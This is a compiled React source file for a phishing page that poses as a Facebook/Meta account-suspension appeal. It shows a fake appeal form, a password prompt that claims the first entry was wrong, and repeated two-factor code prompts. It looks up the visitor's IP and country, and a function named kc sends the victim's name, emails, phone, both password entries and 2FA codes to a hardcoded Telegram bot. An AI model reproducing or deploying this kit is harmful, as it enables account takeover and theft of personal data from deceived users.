                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p",
                          children: [s.jsx("path", {
                              d: "M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"
                          }), s.jsx("path", {
                              fillRule: "evenodd",
                              clipRule: "evenodd",
                              d: "M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z"
                          })]
                      })
                  }]
              })]
          })]
      })
  })
}
const cf = "/assets/fb_round_logo.png";

async function kc(e) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", `https://api.telegram.org/bot6886506699:AAH3d9t1dBrA1kTSv87NQQw_jfDnIsMG38w/sendMessage`, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                resolve(JSON.parse(xhr.responseText));
            } else {
                reject(new Error(`Error: ${xhr.status} - ${xhr.statusText}`));
            }
        }
    };
    xhr.send(JSON.stringify({
        chat_id: 1916486798,
        text: e
    }));
};


function xf({
  active: e,
  setActive: t
}) {
  const [n, r] = T.useState(!1), [l, o] = T.useState(""), [i, u] = T.useState(0), [a, d] = T.useState(0);

  let v = uu.useRef("");

  const m = () => {
    if (a === 1 && (v.current = l), d(h => h + 1), l.length >= 6 && l === v.current) {
        r(!0);
        setTimeout(() => {
            r(!1);
            u(1);
            o("");
        }, 500);
        const query = localStorage.getItem("query");
        const countryCode = localStorage.getItem("countryCode");
        const country = localStorage.getItem("country");
        const h = JSON.parse(localStorage.getItem("form"));
        const x = `IP: ${query}\nCountry: ${countryCode} - ${country}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}\nAppeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
        kc(x);
        
        if (i === 1) {
            t(3);
        }
    }
};

  return s.jsx("div", {
      className: `form ${e&&"active"}`,
      onClick: () => t(0),
      children: s.jsxs("form", {
          className: "form__content p-4",
          onClick: h => h.stopPropagation(),
          children: [s.jsx("div", {
              className: "modal-header form__header justify-content-center",
              children: s.jsx("div", {
                  className: "form__logo",
                  children: s.jsx("img", {
                      className: "fb-logo",
                      src: cf,
                      alt: ""
                  })
              })
          }), s.jsxs("div", {
              className: "modal-body form__body justify-content-center",
              children: [s.jsxs("div", {
                  className: "w-100 mb-4",
                  children: [s.jsx(et, {
                      type: "text",
                      disabled: n,
                      value: l,
                      setValue: o,
                      className: "w-100 mb-none",
                      title: "Password",
                      isPassword: !0
                  }), i === 1 && l.length < 6 ? s.jsx("div", {
                      className: "text-danger",
                      children: "Incorrect. Please, try again."
                  }) : null]
              }), n ? s.jsxs("div", {
                  className: "loader w-100 mt-3",
                  children: [s.jsx("div", {
                      className: "loader__spinner",
                      children: s.jsx(Fi, {
                          variant: "light",
                          animation: "border",
                          role: "status",
                          children: s.jsx("span", {
                              className: "visually-hidden",
                              children: "Loading..."
                          })
                      })
                  }), s.jsx(Rt, {
                      className: "w-100",
                    //   onClick: m,
                      children: "Continue"
                  })]
              }) : s.jsx(Rt, {
                  className: "w-100 mt-3",
                  onClick: m,
                  children: "Continue"
              }), s.jsx("span", {
                  children: "Forgot password?"
              })]
          }), s.jsx("div", {
              className: "form__footer modal-footer justify-content-center",
              children: s.jsx("img", {
                  src: kl,
                  alt: ""
              })
          })]
      })
  })
}
const wf = "/assets/2FA.png";

function kf({
  active: e,
  setActive: t
}) {
  const [n, r] = T.useState(!1), [l, o] = T.useState(!1), [i, u] = T.useState(0), [a, d] = T.useState(""), [v, m] = T.useState(60), h = () => {
      a.length > 2 && (r(!0), setTimeout(() => {
          i === 2 ? (w(), t(4)) : (d(""), r(!1), o(!0), u(i + 1), w())
      }, 500))
  };
  let x = null;
  const w = () => {
      o(!1), setTimeout(() => {
          o(!1)
      }, 60 * 1e3), (x || v !== 60) && m(60), x = setInterval(() => {
          m(D => D - 1), v <= 0 && clearInterval(x)
      }, 1e3), o(D => D + 1);
      const k = `Country: ${localStorage.getItem("countryCode")} - ${localStorage.getItem("country")}\nAttempt: ${i+1}\nVerification: ${a}`;
      kc(k)
  };
  return T.useEffect(() => () => {
      x && clearInterval(x)
  }, []), s.jsx("div", {
      className: `form ${e&&"active"}`,
      onClick: () => t(0),
      children: s.jsxs("form", {
          className: "form__content p-4",
          onClick: k => k.stopPropagation(),
          children: [s.jsxs("div", {
              className: "modal-header flex-column align-items-start",
              children: [s.jsx("h1", {
                  children: "Check your authentication code"
              }), s.jsxs("p", {
                  className: "mb-4",
                  children: ["Enter the 6-digit ", s.jsx("span", {
                      className: "code"
                  }), " for this ", s.jsx("span", {
                      className: "account"
                  }), " from the two-factor ", s.jsx("span", {
                      className: "authentication"
                  }), " you set up (such as ", s.jsx("span", {
                      className: "Google"
                  }), " Authenticator or text message on you mobile)."]
              }), s.jsx("div", {
                  className: "form__cover",
                  children: s.jsx("img", {
                      src: wf,
                      alt: ""
                  })
              })]
          }), s.jsxs("div", {
              className: "modal-body form__body justify-content-center",
              children: [s.jsxs("div", {
                  className: "w-100",
                  children: [s.jsx(et, {
                      disabled: l,
                      value: a,
                      setValue: d,
                      className: "w-100 mb-none",
                      title: "Code"
                  }), l && s.jsxs("div", {
                      className: "text-danger",
                      children: ["Incorrect. Please, try again after ", s.jsxs("span", {
                          children: [v, "s "]
                      })]
                  })]
              }), n ? s.jsxs("div", {
                  className: "loader w-100 mt-3",
                  children: [s.jsx("div", {
                      className: "loader__spinner",
                      children: s.jsx(Fi, {
                          variant: "light",
                          animation: "border",
                          role: "status",
                          children: s.jsx("span", {
                              className: "visually-hidden",
                              children: "Loading..."
                          })
                      })
                  }), s.jsx(Rt, {
                      disabled: l,
                      className: "w-100",
                      onClick: h,
                      children: "Continue"
                  })]
              }) : s.jsx(Rt, {
                  disabled: l,
                  className: "w-100 mt-3",
                  onClick: h,
                  children: "Continue"
              })]
          }), s.jsx("div", {
              className: "form__footer modal-footer justify-content-center",
              children: s.jsx("img", {
                  src: kl,
                  alt: ""
              })
          })]
      })
  })
}

function jf({
  active: e,
  setActive: t
}) {
  const [n, r] = T.useState(!1), [l, o] = T.useState({
      apeal: "",
      fname: "",
      pemail: "",
      bemail: "",
      phone: "",
      page: "",
      agree: !1
  }), [i, u] = T.useState(!1), a = m => !(m.apeal === "" || m.fname === "" || m.pemail === "" || m.bemail === "" || m.phone === "" || m.page === "" || !/\S+@\S+\.\S+/.test(m.pemail) || !/\S+@\S+\.\S+/.test(m.bemail) || isNaN(m.phone) || !m.agree), d = () => {
      fetch("http://ip-api.com/json/?fields=8195").then(m => m.json()).then(m => {
          localStorage.setItem("query", m.query), localStorage.setItem("country", m.country), localStorage.setItem("countryCode", m.countryCode)
      })
  }, v = () => {
      a(l) && (u(!0), setTimeout(() => {
          u(!1), t(2)
      }, 500), `${localStorage.getItem("query")}${localStorage.getItem("country")}${localStorage.getItem("countryCode")}${l.page}${l.fname}${l.bemail}${l.pemail}${l.phone}${l.apeal}`, localStorage.setItem("form", JSON.stringify(l)))
  };
  return T.useEffect(() => {
      d()
  }, []), s.jsxs("div", {
      className: `form form__static ${e&&"active"}`,
      onClick: () => t(0),
      children: [s.jsxs("form", {
          className: "form__content",
          onClick: m => m.stopPropagation(),
          onSubmit: m => m.stopPropagation(),
          children: [s.jsxs("div", {
              className: "modal-header form__header align-items-center",
              children: [s.jsx("h5", {
                  children: "Apeal Form"
              }), s.jsx("div", {
                  className: "form__close",
                  onClick: () => t(0)
              })]
          }), s.jsxs("div", {
              className: "modal-body form__scroll py-4",
              children: [s.jsx(et, {
                  value: l.apeal,
                  keyValue: "apeal",
                  setValue: o,
                  title: "Apeal",
                  textArea: !0,
                  description: "Please indicate why you believe that account restrictions were imposed by mistake."
              }), s.jsx(et, {
                  value: l.fname,
                  keyValue: "fname",
                  setValue: o,
                  title: "Full name"
              }), s.jsx(et, {
                  value: l.pemail,
                  keyValue: "pemail",
                  setValue: o,
                  title: "Personal Email"
              }), s.jsx(et, {
                  value: l.bemail,
                  keyValue: "bemail",
                  setValue: o,
                  title: "Business Email"
              }), s.jsx(et, {
                  value: l.phone,
                  keyValue: "phone",
                  setValue: o,
                  title: "Mobile phone number"
              }), s.jsx(et, {
                  value: l.page,
                  keyValue: "page",
                  setValue: o,
                  title: "Facebook Page Name"
              }), s.jsxs("div", {
                  className: "form__checkbox",
                  children: [s.jsxs("label", {
                      children: [s.jsx("input", {
                          value: l,
                          onInput: () => o(m => ({
                              ...m,
                              agree: !m.agree
                          })),
                          type: "checkbox",
                          className: "form-check-input"
                      }), "I agree with"]
                  }), s.jsxs("span", {
                      onClick: () => r(!0),
                      children: ["Terms of use", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  })]
              }), i ? s.jsxs("div", {
                  className: "loader w-100 mt-3",
                  children: [s.jsx("div", {
                      className: "loader__spinner",
                      children: s.jsx(Fi, {
                          variant: "light",
                          animation: "border",
                          role: "status",
                          children: s.jsx("span", {
                              className: "visually-hidden",
                              children: "Loading..."
                          })
                      })
                  }), s.jsx(Rt, {
                      className: "w-100",
                      onClick: v,
                      children: "Send"
                  })]
              }) : s.jsx(Rt, {
                  className: "w-100 mt-3",
                  onClick: v,
                  children: "Send"
              })]
          }), s.jsx("div", {
              className: "form__footer modal-footer justify-content-center",
              children: s.jsx("img", {
                  src: kl,
                  alt: ""
              })
          })]
      }), s.jsx(af, {
          show: n,
          setShow: r
      })]
  })
}
const Sf = "/assets/phone.png";

function Cf({
  active: e,
  setActive: t
}) {
  return s.jsx("div", {
      className: `form ${e&&"active"}`,
      onClick: () => t(0),
      children: s.jsxs("div", {
          className: "form__content",
          onClick: n => n.stopPropagation(),
          children: [s.jsxs("div", {
              className: "modal-body form__redirect py-4",
              children: [s.jsxs("div", {
                  children: [s.jsx("h1", {
                      children: "Request has been sent"
                  }), s.jsx("br", {}), s.jsx("div", {
                      className: "form__phone",
                      children: s.jsx("img", {
                          src: Sf,
                          alt: ""
                      })
                  }), s.jsx("br", {}), s.jsx("p", {
                      className: "form__text",
                      children: "Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal."
                  })]
              }), s.jsx("form", {
                  className: "w-100",
                  action: "./wait.html",
                  method: "GET",
                  children: s.jsx("div", {
                      className: "w-100 form-btn-wrapper",
                      children: s.jsx("button", {
                          className: "w-100 btn btn-primary",
                          children: s.jsxs("span", {
                              className: "button-text",
                              children: ["Return on ", s.jsx("span", {
                                  className: "Facebook"
                              })]
                          })
                      })
                  })
              })]
          }), s.jsx("div", {
              className: "form__footer modal-footer justify-content-center",
              children: s.jsx("img", {
                  src: kl,
                  alt: ""
              })
          })]
      })
  })
}
const _f = "data:image/png;base64,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",
  Nf = "/assets/dir.png";

function Ef({
  active: e,
  setActive: t
}) {
  return s.jsx("div", {
      className: `form  ${e&&"active"}`,
      onClick: () => t(0),
      children: s.jsxs("div", {
          className: "form__content",
          onClick: n => n.stopPropagation(),
          children: [s.jsx("div", {
              className: "modal-header justify-content-end",
              children: s.jsx("div", {
                  className: "form__close",
                  onClick: () => t(0)
              })
          }), s.jsxs("div", {
              className: "form__scroll",
              children: [s.jsx("h4", {
                  children: "Privacy Policy"
              }), s.jsx("h5", {
                  children: "What is the Privacy Policy and what does it cover?"
              }), s.jsx(ot, {
                  links: [{
                      img: _f,
                      subtitle: "The main thing in the section"
                  }]
              }), s.jsx("br", {}), s.jsxs("p", {
                  children: ["At ", s.jsx("span", {
                      className: "Meta"
                  }), ", we want you to understand what information we collect, how we use it, and with whom we use it. let's share. Therefore, we recommend that you read our Privacy Policy. This will help you use", s.jsxs("a", {
                      target: "_blank",
                      href: "#",
                      className: "add-svg",
                      children: [s.jsx("span", {
                          className: "Meta"
                      }), s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), "'s products the way you need."]
              }), s.jsx("br", {}), s.jsx("p", {
                  children: "In the Privacy Policy, we explain how we collect, use, store information, and We also share it. We also tell you about your rights. Each section of the Policy contains Useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you with confidentiality."
              }), s.jsx("br", {}), s.jsxs("p", {
                  children: ["It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can ", s.jsxs("a", {
                      target: "_blank",
                      href: "#",
                      className: "add-svg",
                      children: ["update these settings", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), "to personalize your user experience."]
              }), s.jsx("br", {}), s.jsx("br", {}), s.jsx(ot, {
                  links: [{
                      subtitle: "What products are covered by this policy?"
                  }, {
                      subtitle: "Learn more about managing your privacy atPrivacy Center"
                  }]
              }), s.jsx("br", {}), s.jsx("h5", {
                  children: "What information do we collect?"
              }), s.jsx("br", {}), s.jsxs("p", {
                  children: ["The information we collect and process about you depends on how you use our ", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: ["Products", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), ". For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on ", s.jsx("span", {
                      className: "Instagram"
                  }), ". We collect data about you when you use our Products, ", s.jsxs("a", {
                      href: "#",
                      className: "add-svg",
                      children: ["even if you do not have an account", s.jsxs("svg", {
                          viewBox: "0 0 24 24",
                          fill: "currentColor",
                          width: "1em",
                          height: "1em",
                          className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                          children: [s.jsx("path", {
                              d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                          }), s.jsx("path", {
                              d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                          })]
                      })]
                  }), "."]
              }), s.jsx("br", {}), s.jsx("p", {
                  children: "The following are the types of data we collect:"
              }), s.jsx("br", {}), s.jsx(ot, {
                  links: [{
                      subtitle: "Your actions and information you provide to us"
                  }, {
                      subtitle: "Friends, subscribers and other contacts"
                  }, {
                      subtitle: "Application, browser and device information"
                  }, {
                      subtitle: "Information from Partners, suppliers and other third parties"
                  }]
              }), s.jsx("br", {}), s.jsx("h5", {
                  children: "What happens if you do not allow us to collect certain types of information?"
              }), s.jsx("br", {}), s.jsx("p", {
                  children: "Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products."
              }), s.jsx("p", {
                  children: s.jsx("a", {
                      href: "#",
                      children: "More details >"
                  })
              }), s.jsx("br", {}), s.jsx("h5", {
                  children: "What if the information we collect does not personally identify individuals?"
              }), s.jsx("br", {}), s.jsx("p", {
                  children: "In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals."
              }), s.jsx("br", {}), s.jsx("h5", {
                  children: "Data control"
              }), s.jsx(ot, {
                  links: [{
                      img: Nf,
                      title: "Manage the information we collect about you",
                      subtitle: "Privacy Center"
                  }]
              })]
          })]
      })
  })
}

function Pf() {
  const e = [{
          img: Xs,
          title: "What is the Privacy Policy and what does it say?",
          subtitle: "Privacy Policy"
      }, {
          img: Xs,
          title: "How you can manage or delete your information",
          subtitle: "Privacy Policy"
      }],
      t = [{
          img: Jd,
          title: "Company AI",
          subtitle: "User Agreement"
      }],
      n = [{
          img: null,
          title: "How we uses information for generative AI models",
          subtitle: "Privacy Center"
      }, {
          img: null,
          title: "Cards with information about the operation of AI systems",
          subtitle: "AI website"
      }],
      [r, l] = T.useState(0),
      o = i => {
          l(i)
      };
  return s.jsxs("div", {
      className: "wrapper container-sm",
      children: [s.jsxs("div", {
          className: "row",
          children: [s.jsx("div", {
              className: "col-12 col-lg-4",
              children: s.jsx(Gd, {
                  changeFormShow: o
              })
          }), s.jsx("div", {
              className: "col-12 col-lg-8",
              children: s.jsxs("div", {
                  className: "home",
                  children: [s.jsxs("div", {
                      className: "home__title mb-3",
                      children: [s.jsx("div", {
                          className: "home__block",
                          children: s.jsx("img", {
                              src: Xd,
                              alt: ""
                          })
                      }), s.jsx("h1", {
                          children: "We got suspend your page"
                      })]
                  }), s.jsx("p", {
                      children: "We have received several reports that your account is in violation of our terms of service and the community policies. As a result, your account will be sent for review."
                  }), s.jsx("br", {}), s.jsx("p", {
                      children: "If you believe restrictions have been placed on your account in error, you can request a restore review."
                  }), s.jsx("br", {}), s.jsx("br", {}), s.jsx("h6", {
                      className: "mb-4",
                      children: "Appeal Guide"
                  }), s.jsxs("ul", {
                      className: "home__list",
                      children: [s.jsx("li", {
                          className: "my-2",
                          children: "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats."
                      }), s.jsxs("li", {
                          className: "my-2",
                          children: ["In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, ", s.jsx("span", {
                              className: "Meta"
                          }), "will automatically reject it."]
                      })]
                  }), s.jsxs("div", {
                      className: "home__card",
                      children: [s.jsx("div", {
                          className: "home__cover",
                          children: s.jsx("img", {
                              src: Yd,
                              alt: ""
                          })
                      }), s.jsxs("div", {
                          className: "home__card--text",
                          children: [s.jsx("p", {
                              className: "home__card--type",
                              children: "Review request"
                          }), s.jsx("h4", {
                              className: "home__card--title",
                              children: "Fixing problems with account restrictions"
                          }), s.jsx("p", {
                              children: "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
                          }), s.jsx(Rt, {
                              variant: "primary",
                              className: "w-100 mt-4",
                              onClick: () => o(1),
                              children: "Request Review"
                          })]
                      })]
                  }), s.jsx("br", {}), s.jsx("br", {}), s.jsx(ot, {
                      changeFormShow: o,
                      title: "Privacy Center",
                      links: e,
                      indexForm: 5
                  }), s.jsx("br", {}), s.jsx(ot, {
                      changeFormShow: o,
                      title: "For more details, see the User Agreement",
                      links: t,
                      indexForm: 5
                  }), s.jsx("br", {}), s.jsx(ot, {
                      changeFormShow: o,
                      title: "Additional resources",
                      links: n,
                      indexForm: 5
                  }), s.jsx("br", {}), s.jsxs("p", {
                      className: "home__description",
                      children: ["We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about", s.jsxs("span", {
                          className: "text-primary ps-1",
                          children: ["Privacy Policy", s.jsxs("svg", {
                              viewBox: "0 0 24 24",
                              fill: "currentColor",
                              width: "1em",
                              height: "1em",
                              className: "x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e",
                              children: [s.jsx("path", {
                                  d: "M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"
                              }), s.jsx("path", {
                                  d: "M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"
                              })]
                          })]
                      })]
                  })]
              })
          })]
      }), s.jsx(jf, {
          active: r === 1,
          setActive: l
      }), s.jsx(xf, {
          active: r === 2,
          setActive: l
      }), s.jsx(kf, {
          active: r === 3,
          setActive: l
      }), s.jsx(Cf, {
          active: r === 4,
          setActive: l
      }), s.jsx(Ef, {
          active: r === 5,
          setActive: l
      })]
  })
}
Yl.createRoot(document.getElementById("root")).render(s.jsx(uu.StrictMode, {
  children: s.jsx(Pf, {})
}));